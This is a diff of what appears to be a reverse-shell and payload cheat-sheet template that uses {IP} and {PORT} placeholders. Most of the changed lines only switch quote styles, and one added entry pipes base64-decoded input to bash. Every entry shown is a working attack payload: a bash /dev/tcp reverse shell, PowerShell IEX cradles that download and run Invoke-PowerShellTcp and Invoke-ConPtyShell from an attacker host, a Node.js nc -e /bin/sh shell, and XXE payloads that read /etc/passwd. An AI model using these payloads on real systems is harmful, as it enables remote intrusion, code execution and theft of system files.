@@ -93,6 +93,10 @@ bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261%22
 
 echo {BASE64} | base64 -d | bash
 
+#EXAMPLE
+
+echo {BASE64_URLENCODE} | base64 -d | bash
+
 #INDEX
 
 #EXAMPLE
@@ -422,22 +426,22 @@ $client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $clie
 
 #References => https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 
-powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}"
+powershell.exe 'IEX(New-Object Net.WebClient).downloadString("http://{IP}/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}'
 
 
 #EXAMPLE
 
-powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1')"
+powershell.exe 'IEX(New-Object Net.WebClient).downloadString("http://{IP}/Invoke-PowerShellTcp.ps1")'
 
 #EXAMPLE
 
 #References => https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
 
-powershell.exe "IEX(IWR http://{IP}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {IP} {PORT}"
+powershell.exe 'IEX(IWR http://{IP}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {IP} {PORT}'
 
 #EXAMPLE
 
-powershell.exe "iex(iwr -usebasicparsing http://{IP}/Invoke-PowerShellTcp.ps1)"
+powershell.exe 'iex(iwr -usebasicparsing http://{IP}/Invoke-PowerShellTcp.ps1)'
 
 #EXAMPLE
 
@@ -474,7 +478,7 @@ powershell.exe -e {BASE64PS1_3}
 
 #EXAMPLE
 
-require('child_process').exec('nc -e /bin/sh {IP} {PORT}')
+require("child_process").exec("nc -e /bin/sh {IP} {PORT}")
 
 #EXAMPLE
 
@@ -1198,7 +1202,7 @@ echo {BASE64} | base64 -d | bash
 #Extra
 
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'> ]>
 <comment>
   <name>&xxe;</name>
   <author>test</author>
@@ -1208,7 +1212,7 @@ echo {BASE64} | base64 -d | bash
 #Extra
 
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'> ]>
 <data>
   <name>&xxe;</name>
 </data>
